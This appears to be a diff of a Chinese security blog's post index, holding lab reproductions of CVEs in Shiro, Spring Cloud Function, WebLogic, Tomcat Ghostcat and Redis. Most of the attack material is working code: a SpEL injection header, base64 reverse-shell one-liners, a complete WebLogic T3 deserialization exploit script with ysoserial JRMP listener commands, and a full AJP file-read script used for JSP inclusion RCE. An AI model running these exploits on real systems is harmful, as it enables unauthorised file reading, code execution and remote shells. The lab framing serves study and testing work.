-<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>Shiro1.1.0 版本之前进行安全校验前缺少对 URL 标准化处理，Shiro 拦截器执行的是严格的字符串匹配或者正则匹配，就会认为/./admin 与/admin/不同（./当前目录，../上一级目录）；后端 Web 容器为了兼容性，会自动解析 URL 中的相对路径符号</p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>现成的 vulhub 来拉取镜像</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#下载vulhub源代码</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">#进入漏洞目录</span><br><span class="line">cd vulhub/shiro/CVE-2010-3863</span><br><span class="line">#拉取镜像</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></tbody></table></figure>
-
-<!-- 这是一张图片，ocr 内容为： -->
-<p><img src="/2026/02/08/CVE-2010-3863/1770523893257-9bf3a2eb-59f1-4a14-97cf-59fc3c0f1a88.png"></p>
-<p>用 burpsuite 抓取 http://靶机 ip:8080/admin/</p>
-<p><img src="/2026/02/08/CVE-2010-3863/1773377933167.png" alt="1773377933167"></p>
-<p>发送到 Repeater 模块</p>
-<p><img src="/2026/02/08/CVE-2010-3863/1773377963803.png" alt="1773377963803"></p>
-<p>直接发送会返回 302，重定向到登录页面</p>
-<p><img src="/2026/02/08/CVE-2010-3863/1773377976393.png" alt="1773377976393"></p>
-<p>修改路径/./admin/</p>
-<p><img src="/2026/02/08/CVE-2010-3863/1773377992451.png" alt="1773377992451"></p>
-<p>发送后返回 200，绕过登录</p>
-<p><img src="/2026/02/08/CVE-2010-3863/1773378034342.png" alt="1773378034342"></p>
-<p>直接访问没办法直接复现，可能原因是浏览器自动帮忙修复错误的 URL，而 Burpsuite 不会修复</p>
-]]></content>
-      <categories>
-        <category>漏洞</category>
-      </categories>
-      <tags>
-        <tag>CVE</tag>
-        <tag>Shiro</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Spring Cloud Function 远程代码执行漏洞 CVE-2022-22963</title>
-    <url>/2026/02/04/CVE-2022-22963/</url>
-    <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
-<li>Spring Cloud Function 3.0.0 - 3.1.6</li>
-<li>Spring Cloud Function 3.2.0 - 3.2.2</li>
-</ul>
-<h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><p> SpEL 表达式注入</p>
-<h2 id="操作系统限制"><a href="#操作系统限制" class="headerlink" title="操作系统限制"></a>操作系统限制</h2><p>无</p>
-<h2 id="配置要求"><a href="#配置要求" class="headerlink" title="配置要求"></a>配置要求</h2><p>默认配置</p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>命令执行，进行反弹 shell，写入木马</p>
-<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>Spring Cloud Function 引入 RoutingFunction 功能，允许开发者根据特定条件动态将请求分发给不同函数执行，框架允许通过 HTTP Header 来指定路由逻辑。当请求到达时，RoutingFunction 会检查是否存在特定 HTTP 请求头：spring.cloud.function.routing-expression，如果存在该 Header，框架会将其值作为 SpEL 表达式处理，攻击者可以构造恶意 payload 注入到 spring.cloud.function.routing-expression 属性值，服务器处理 POST 请求时候，识别到恶意 payload 就会触发解析，执行恶意命令。POST 请求主体不能为空，若为空，Spring 的 MessageConverter 可能不会触发后续参数绑定和路由解析流程</p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>现成的 vulhub 来拉取镜像</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#下载vulhub源代码</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">#进入漏洞目录</span><br><span class="line">cd vulhub/spring/CVE-2022-22963</span><br><span class="line">#拉取镜像</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="/2026/02/04/CVE-2022-22963/1773373961506.png" alt="1773373961506"></p>
-<p>用 burpsuite 抓取 http://公网: 8080/uppercase 数据包</p>
-<p><img src="/2026/02/04/CVE-2022-22963/1773373999475.png" alt="1773373999475"></p>
-<p>发送到 Repeater 模块</p>
-<p><img src="/2026/02/04/CVE-2022-22963/1773374028579.png" alt="1773374028579"></p>
-<p>修改请求类型为 POST，路径改为/functionRouter，将内容类型改为 Content-Type: text/plain，并在内容类型上一行注入恶意代码，创建 /tmp/success，还要在请求主体写入数据，这里填 test</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("touch /tmp/success")</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="/2026/02/04/CVE-2022-22963/1773374058562.png" alt="1773374058562"></p>
-<p>返回 500</p>
-<p><img src="/2026/02/04/CVE-2022-22963/1773374098488.png" alt="1773374098488"></p>
-<p>进入容器查看文件夹 tmp，发现 success 文件，说明成功执行敏感命令</p>
-<p><img src="/2026/02/04/CVE-2022-22963/1773374122900.png" alt="1773374122900"></p>
-<p>下面尝试进行反弹 shell，开启监听，nc -lvvp 7777</p>
-<p><img src="/2026/02/04/CVE-2022-22963/1773374153226.png" alt="1773374153226"></p>
-<p>将下面命令替换到原 payload 的 touch /tmp/success</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">bash -c {echo,反弹shell的base64编码}|{base64,-d}|{bash,-i}</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="/2026/02/04/CVE-2022-22963/1773374183055.png" alt="1773374183055"></p>
-<p>连接成功，虽然不稳定</p>
-<p><img src="/2026/02/04/CVE-2022-22963/1773374207523.png" alt="1773374207523"></p>
-]]></content>
-      <categories>
-        <category>漏洞</category>
-      </categories>
-      <tags>
-        <tag>CVE</tag>
-        <tag>Spring</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Weblogic 命令执行漏洞 CVE-2018-2628</title>
-    <url>/2026/02/07/CVE-2018-2628/</url>
-    <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
-<li>WebLogic 10.3.6.0.0</li>
-<li>WebLogic 12.1.3.0.0</li>
-<li>WebLogic 12.2.1.2.0</li>
-<li>WebLogic 12.2.1.3.0</li>
-</ul>
-<h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><p>Java 反序列化</p>
-<h2 id="操作系统限制"><a href="#操作系统限制" class="headerlink" title="操作系统限制"></a>操作系统限制</h2><p>无</p>
-<h2 id="配置要求"><a href="#配置要求" class="headerlink" title="配置要求"></a>配置要求</h2><ul>
-<li>对外开放 7001</li>
-</ul>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>命令执行，反弹 shell</p>
-<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>WebLogic 为防范反序列化设置黑名单，sun.rmi.server.UniicasetRef 不在黑名单内，T3 协议是 WebLogic 独有的通信协议，主要用于不同 Java 虚拟机之间传输对象，WebLogic 默认所以端口都支持 T3，攻击者通过 T3 协议把精心构造的 UnicastRef 序列化对象发给 WebLogic，WebLogic 反序列化对象时，会作为 JRMP 客户端主动连接攻击者服务器，攻击者服务器下发恶意 payload，此时 WebLogic，是通过 JRMP 协议进行数据传输，从而绕过最外层的 T3 协议过滤器</p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>现成的 vulhub 来拉取镜像</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#下载vulhub源代码</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">#进入漏洞目录</span><br><span class="line">cd vulhub/weblogic/CVE-2018-2628</span><br><span class="line">#拉取镜像</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="/2026/02/07/CVE-2018-2628/1773400261426.png" alt="1773400261426"></p>
-<p>下载攻击工具并检查是否有 Java 环境</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar -O ysoserial.jar</span><br><span class="line">#检查Java环境</span><br><span class="line">java -version</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="/2026/02/07/CVE-2018-2628/1773400307472.png" alt="1773400307472"></p>
-<p>运行命令</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 监听端口 CommonsCollections1 执行的命令</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="/2026/02/07/CVE-2018-2628/1773400408672.png" alt="1773400408672"></p>
-<p>创建攻击脚本 exploit.py</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">from __future__ import print_function</span><br><span class="line">import binascii</span><br><span class="line">import os</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">def generate_payload(path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client):</span><br><span class="line">    # 生成 ysoserial payload 并转换为十六进制字符串</span><br><span class="line">    command = 'java -jar {} {} {}:{} &gt; payload.out'.format(path_ysoserial, jrmp_client, jrmp_listener_ip, jrmp_listener_port)</span><br><span class="line">    print("[*] 生成 Payload 命令: " + command)</span><br><span class="line">    os.system(command)</span><br><span class="line">    if not os.path.exists('payload.out'):</span><br><span class="line">        print("[!] 错误: payload.out 未生成，请检查 java 环境及 ysoserial 路径")</span><br><span class="line">        sys.exit()</span><br><span class="line">    with open('payload.out', 'rb') as f:</span><br><span class="line">        bin_file = f.read()</span><br><span class="line">    # Python 3 中 hexlify 返回 bytes，需要 decode 为字符串</span><br><span class="line">    return binascii.hexlify(bin_file).decode('ascii')</span><br><span class="line"></span><br><span class="line">def t3_handshake(sock, server_addr):</span><br><span class="line">    sock.connect(server_addr)</span><br><span class="line">    # T3 协议握手包</span><br><span class="line">    handshake = binascii.a2b_hex('74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a')</span><br><span class="line">    sock.send(handshake)</span><br><span class="line">    time.sleep(1)</span><br><span class="line">    res = sock.recv(1024)</span><br><span class="line">    if b'HELO' in res:</span><br><span class="line">        print('[+] T3 握手成功!')</span><br><span class="line">    else:</span><br><span class="line">        print('[!] T3 握手可能失败，收到响应: ', res)</span><br><span class="line"></span><br><span class="line">def build_t3_request_object(sock, port):</span><br><span class="line">    data1 = '000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371'</span><br><span class="line">    # 注入端口号</span><br><span class="line">    data2_hex = '007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000{0}ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07'.format('{:04x}'.format(port))</span><br><span class="line">    data3 = '1a7727000d3234322e323134'</span><br><span class="line">    data4 = '2e312e32353461863d1d0000000078'</span><br><span class="line">    </span><br><span class="line">    for d in [data1, data2_hex, data3, data4]:</span><br><span class="line">        sock.send(binascii.a2b_hex(d))</span><br><span class="line">    time.sleep(2)</span><br><span class="line">    print('[+] 发送 T3 请求对象成功, 接收长度: %d' % (len(sock.recv(2048))))</span><br><span class="line"></span><br><span class="line">def send_payload_objdata(sock, data):</span><br><span class="line">    # data 为十六进制字符串。请注意：这里的 payload_prefix 和 payload_suffix 必须是完整的长字符串，不能断行。</span><br><span class="line">    payload_prefix = '056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000'</span><br><span class="line">    payload_suffix = 'fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff'</span><br><span class="line">    </span><br><span class="line">    full_payload = payload_prefix + data + payload_suffix</span><br><span class="line">    # 计算长度头</span><br><span class="line">    length = '{:08x}'.format(len(full_payload) // 2 + 4)</span><br><span class="line">    final_packet = binascii.a2b_hex(length + full_payload)</span><br><span class="line">    </span><br><span class="line">    sock.send(final_packet)</span><br><span class="line">    time.sleep(2)</span><br><span class="line">    # 重发确认</span><br><span class="line">    sock.send(final_packet)</span><br><span class="line">    </span><br><span class="line">    res = b''</span><br><span class="line">    try:</span><br><span class="line">        while True:</span><br><span class="line">            chunk = sock.recv(4096)</span><br><span class="line">            if not chunk: break</span><br><span class="line">            res += chunk</span><br><span class="line">            time.sleep(0.1)</span><br><span class="line">    except Exception:</span><br><span class="line">        pass</span><br><span class="line">    return res.decode('ascii', errors='ignore')</span><br><span class="line"></span><br><span class="line">def exploit(dip, dport, path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client):</span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.settimeout(15)</span><br><span class="line">    server_addr = (dip, dport)</span><br><span class="line">    try:</span><br><span class="line">        t3_handshake(sock, server_addr)</span><br><span class="line">        build_t3_request_object(sock, dport)</span><br><span class="line">        payload_hex = generate_payload(path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client)</span><br><span class="line">        print("[*] Payload 生成成功 (长度: %d)" % len(payload_hex))</span><br><span class="line">        rs = send_payload_objdata(sock, payload_hex)</span><br><span class="line">        print('[+] 利用尝试完成！请检查 JRMPListener 和 NC 终端。')</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print("[!] 发生错误: ", e)</span><br><span class="line">    finally:</span><br><span class="line">        sock.close()</span><br><span class="line"></span><br><span class="line">if __name__=="__main__":</span><br><span class="line">    if len(sys.argv) != 7:</span><br><span class="line">        print('\n用法:\npython3 exploit.py [靶机IP] [靶机端口] [ysoserial路径] '</span><br><span class="line">              '[JRMP监听IP] [JRMP监听端口] [JRMPClient]\n')</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line">    dip = sys.argv[1]</span><br><span class="line">    dport = int(sys.argv[2])</span><br><span class="line">    path_ysoserial = sys.argv[3]</span><br><span class="line">    jrmp_listener_ip = sys.argv[4]</span><br><span class="line">    jrmp_listener_port = sys.argv[5]</span><br><span class="line">    jrmp_client = sys.argv[6]</span><br><span class="line">    exploit(dip, dport, path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client)</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="/2026/02/07/CVE-2018-2628/1773400451085.png" alt="1773400451085"></p>
-<p>运行攻击脚本</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">python3 exploit.py 靶机ip 7001 ysoserial.jar 攻击机ip ysoserial监听的端口 JRMPClient</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="/2026/02/07/CVE-2018-2628/1773400505342.png" alt="1773400505342"></p>
-<p>运行 ysoserial 窗口有回显</p>
-<p><img src="/2026/02/07/CVE-2018-2628/1773400551030.png" alt="1773400551030"></p>
-<p>进入容器内部查看 tmp 文件夹，发现有 success，说明命令执行成功</p>
-<p><img src="/2026/02/07/CVE-2018-2628/1773400593203.png" alt="1773400593203"></p>
-<p>下面进行 getshell，开启 nc 监听，nc -lvnp 监听端口</p>
-<p><img src="/2026/02/07/CVE-2018-2628/1773400626185.png" alt="1773400626185"></p>
-<p>使用 ysoserial 攻击执行反弹 shell 命令</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 'bash -c {echo,反弹shell的base64编码}|{base64,-d}|{bash,-i}'</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="/2026/02/07/CVE-2018-2628/1773400661414.png" alt="1773400661414"></p>
-<p>运行攻击脚本</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">python3 exploit.py 靶机ip 7001 ysoserial.jar 攻击机ip ysoserial监听的端口 JRMPClient</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="/2026/02/07/CVE-2018-2628/1773400714904.png" alt="1773400714904"></p>
-<p>运行 ysoserial 窗口有回显</p>
-<p><img src="/2026/02/07/CVE-2018-2628/1773400763975.png" alt="1773400763975"></p>
-<p>成功连接，虽然不稳定</p>
-<p><img src="/2026/02/07/CVE-2018-2628/1773400811191.png" alt="1773400811191"></p>
-]]></content>
-      <categories>
-        <category>漏洞</category>
-      </categories>
-      <tags>
-        <tag>CVE</tag>
-        <tag>WebLogic</tag>
       </tags>
   </entry>
   <entry>
@@ -1020,6 +731,603 @@
       </tags>
   </entry>
   <entry>
+    <title>Tomcat 文件包含漏洞 CVE-2020-1938</title>
+    <url>/2026/02/12/CVE-2020-1938/</url>
+    <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
+<li>Apache Tomcat 6.x (全版本受影响)</li>
+<li>Apache Tomcat 7.0.0 - 7.0.99</li>
+<li>Apache Tomcat 8.5.0 - 8.5.50</li>
+<li>Apache Tomcat 9.0.0.M1 - 9.0.30</li>
+</ul>
+<h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><p>二进制解析漏洞</p>
+<h2 id="操作系统限制"><a href="#操作系统限制" class="headerlink" title="操作系统限制"></a>操作系统限制</h2><p>无</p>
+<h2 id="配置要求"><a href="#配置要求" class="headerlink" title="配置要求"></a>配置要求</h2><p>8009 端口打开</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ul>
+<li>任意文件读取，例如读取 WEB - INF / web.xml 文件，只能读取使用 AJP 目录下的文件</li>
+<li>文件包含，RCE 远程代码执行，可以是反弹 shell</li>
+</ul>
+<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p> AJP 协议默认监听端口通常缺乏认证，利用协议缺陷，伪造 javax.servlet.include 属性</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#拉取镜像</span><br><span class="line">docker run -d -p 8082:8080 -p 8009:8009 --name ghostcat-vulhub vulhub/tomcat:9.0.30</span><br></pre></td></tr></tbody></table></figure>
+
+<p>使用云服务器：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#写入攻击脚本</span><br><span class="line">cat &lt;&lt; 'EOF' &gt; ghostcat.py</span><br><span class="line">import socket</span><br><span class="line">import struct</span><br><span class="line"></span><br><span class="line">def pack_string(s):</span><br><span class="line">    if s is None: return struct.pack('&gt;H', 0xffff)</span><br><span class="line">    b = s.encode('utf-8')</span><br><span class="line">    return struct.pack('&gt;H', len(b)) + b + b'\x00'</span><br><span class="line"></span><br><span class="line">def exploit(target_host, target_port, file_path):</span><br><span class="line">    # AJP13 Forward Request Header</span><br><span class="line">    # 0x02 = Forward Request, 0x02 = GET Method</span><br><span class="line">    data = b'\x02\x02' </span><br><span class="line">    data += pack_string("HTTP/1.1")</span><br><span class="line">    data += pack_string("/index.jsp")</span><br><span class="line">    data += pack_string("127.0.0.1")</span><br><span class="line">    data += pack_string(None)</span><br><span class="line">    data += pack_string("127.0.0.1")</span><br><span class="line">    data += struct.pack('&gt;H', 80)</span><br><span class="line">    data += b'\x00' # is_ssl: false</span><br><span class="line">    data += struct.pack('&gt;H', 0) # num_headers: 0</span><br><span class="line"></span><br><span class="line">    # 注入核心：Ghostcat 必备的三个属性</span><br><span class="line">    attrs = [</span><br><span class="line">        ("javax.servlet.include.request_uri", "/"),</span><br><span class="line">        ("javax.servlet.include.path_info", file_path),</span><br><span class="line">        ("javax.servlet.include.servlet_path", "/")</span><br><span class="line">    ]</span><br><span class="line">    </span><br><span class="line">    for name, value in attrs:</span><br><span class="line">        data += b'\x0a' # SC_A_REQ_ATTRIBUTE</span><br><span class="line">        data += pack_string(name)</span><br><span class="line">        data += pack_string(value)</span><br><span class="line">    </span><br><span class="line">    data += b'\xff' # terminator</span><br><span class="line"></span><br><span class="line">    # 封装 AJP 头部</span><br><span class="line">    header = b'\x12\x34'</span><br><span class="line">    msg_len = struct.pack('&gt;H', len(data))</span><br><span class="line">    packet = header + msg_len + data</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.settimeout(5)</span><br><span class="line">        s.connect((target_host, target_port))</span><br><span class="line">        s.sendall(packet)</span><br><span class="line">        </span><br><span class="line">        print(f"[*] Attacking {target_host}:{target_port} -&gt; {file_path}")</span><br><span class="line">        </span><br><span class="line">        while True:</span><br><span class="line">            res = s.recv(8192)</span><br><span class="line">            if not res: break</span><br><span class="line">            # 过滤掉 AJP 协议的二进制头，直接输出内容</span><br><span class="line">            print(res.decode('utf-8', errors='ignore'))</span><br><span class="line">        s.close()</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f"[!] Error: {e}")</span><br><span class="line"></span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">    import sys</span><br><span class="line">    host = sys.argv[1] if len(sys.argv) &gt; 1 else '127.0.0.1'</span><br><span class="line">    path = sys.argv[2] if len(sys.argv) &gt; 2 else '/WEB-INF/web.xml'</span><br><span class="line">    exploit(host, 8009, path)</span><br><span class="line">EOF</span><br><span class="line">#运行脚本获取xml文件</span><br><span class="line">python3 ghostcat.py 公网 /WEB-INF/web.xml</span><br></pre></td></tr></tbody></table></figure>
+
+<p>成功复现读取/WEB - INF/web.xml 文件</p>
+<p><img src="/2026/02/12/CVE-2020-1938/1773154158887.png" alt="1773154158887"></p>
+<p>后续进行文件包含，因为靶场环境是纯净的 tomcat，实际环境需要寻找上传点上传木马文件，这里直接写入到靶场中</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#写入敏感文件</span><br><span class="line">docker exec ghostcat-vulhub bash -c 'echo "&lt;% out.println(\"SUCCESS_RCE\"); %&gt;" &gt; /usr/local/tomcat/webapps/ROOT/proof.txt'</span><br><span class="line">#文件包含，并不是简单的txt，里面含有java代码，将静态文本强制解析为Java代码</span><br><span class="line">python3 ghostcat.py 公网 /proof.txt</span><br></pre></td></tr></tbody></table></figure>
+
+<p>出现 SUCCESS_RCE 表明成功实现文件包含，执行了代码</p>
+<p><img src="/2026/02/12/CVE-2020-1938/1773154229210.png" alt="1773154229210"></p>
+]]></content>
+      <categories>
+        <category>漏洞</category>
+      </categories>
+      <tags>
+        <tag>CVE</tag>
+        <tag>Tomcat</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Redis 沙盒逃逸漏洞 CVE-2022-0543</title>
+    <url>/2026/02/08/CVE-2022-0543/</url>
+    <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
+<li>Debian 10 (Buster) Redis 软件包: 5.0 - 5.0.14-1</li>
+<li>Debian 11 (Bullseye) Redis 软件包: 6.0 - 6.0.16-1</li>
+<li>Ubuntu 18.04 LTS Redis 软件包: 4.0.0 - 4.0.9-1ubuntu0.2</li>
+<li>Ubuntu 20.04 LTS Redis 软件包: 5.0.0 - 5.0.7-2ubuntu0.1</li>
+<li>Ubuntu 22.04 LTS Redis 软件包: 6.0.0 - 6.0.15-1ubuntu0.1</li>
+<li>Docker Redis (Debian / Bullseye 变体) 镜像: 5.0.0 - 5.0.14</li>
+<li>Docker Redis (Debian / Bullseye 变体) 镜像: 6.0.0 - 6.0.15</li>
+<li>Kali Linux Redis 软件包: 5.0.0 - 6.0.15</li>
+<li>Raspbian (树莓派) Redis 软件包: 4.0.0 - 6.0.15</li>
+<li>其他 Debian 系衍生版 Redis 软件包: 4.0.0 - 7.0.0-rc2</li>
+</ul>
+<h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><p>Redis Lua 沙箱逃逸</p>
+<h2 id="操作系统限制"><a href="#操作系统限制" class="headerlink" title="操作系统限制"></a>操作系统限制</h2><p>Debian/Ubantu</p>
+<h2 id="配置要求"><a href="#配置要求" class="headerlink" title="配置要求"></a>配置要求</h2><ul>
+<li>开启 6379 端口</li>
+</ul>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>命令执行，反弹 shell</p>
+<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>官方设计的 Redis 中，Lua 脚本运行在高度受限的沙箱环境，Debian 维护者答辩 Redis 时候加入补丁，将 package 模块引入 Lua 的全局环境，package.loadlib 允许 Lua 直接调用 Linux 系统的动态链接库，攻击者通过 redis-cli 连接到未授权或已知密码的 Redis，且目标一致为 Debian / Ubantu 系统，攻击者知道系统自带 Lua 库位置，利用 package.loadlib 重新加载系统库中的 luaopen_os 或 luaopen_io 函数，将 Redis 删除的 os 和 io 模块重新注入回 Lua 环境，攻击者可以调用 os.execute() 执行系统命令，通过 io.popen() 读取执行后回显结果，可以通过这些特性进行 getshell</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>现成的 vulhub 来拉取镜像</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#下载vulhub源代码</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">#进入漏洞目录</span><br><span class="line">cd vulhub/redis/CVE-2022-0543</span><br><span class="line">#拉取镜像</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></tbody></table></figure>
+
